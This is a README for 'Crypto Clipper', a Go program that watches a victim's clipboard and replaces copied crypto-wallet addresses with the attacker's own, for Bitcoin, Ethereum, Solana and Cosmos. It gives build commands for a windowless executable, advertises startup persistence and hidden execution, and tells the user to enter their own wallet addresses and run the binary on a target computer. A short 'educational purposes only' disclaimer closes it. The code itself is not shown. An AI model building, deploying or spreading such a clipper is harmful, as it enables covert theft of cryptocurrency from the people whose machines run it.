<div>
<img src="https://wallpapercave.com/wp/wp9800950.jpg"/>
  <h1 align="center">
    Crypto Clipper 🪙
  </h1>
</div>

<p align="center">
 Built with GOLANG. Supports most popular crypto wallets
</p>

## Features:
- Supports Bitcoin, Ethereum, Solana and Cosmos wallets
- Runs on startup for any platform
- No terminal shows when running

## Installation

### Build the code:
```shell
go build -ldflags -H=windowsgui -o main.exe
```

### Build Cross-Platform (Optional):

#### Install Go Releaser
```shell
go install github.com/goreleaser/goreleaser/v2@latest
```

#### Build the cross platform code
```shell
goreleaser --snapshot --clean                          
```

### USAGE:
- Write your wallets inside of `myWallets` in main.go file
- Build the project
- Execute the .exe file in the computer you want to use it


# Disclaimer
This repository is intended for educational purposes only.

By using or distributing this code, you agree that you are responsible for your actions and any consequences thereof. The author assumes no liability for any misuse or damage caused by this code.
